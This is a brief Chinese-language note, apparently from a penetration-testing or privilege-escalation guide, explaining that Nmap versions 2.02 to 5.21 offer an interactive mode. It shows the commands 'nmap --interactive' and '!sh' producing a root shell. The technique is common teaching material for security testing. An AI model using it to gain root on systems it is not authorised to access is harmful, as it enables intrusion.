较旧版本的 Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令，使用 nmap -V 查看版本是否满足条件。

```
# 进入交互模式
nmap --interactive
# getshell
nmap> !sh
sh-3.2# whoami
root

```
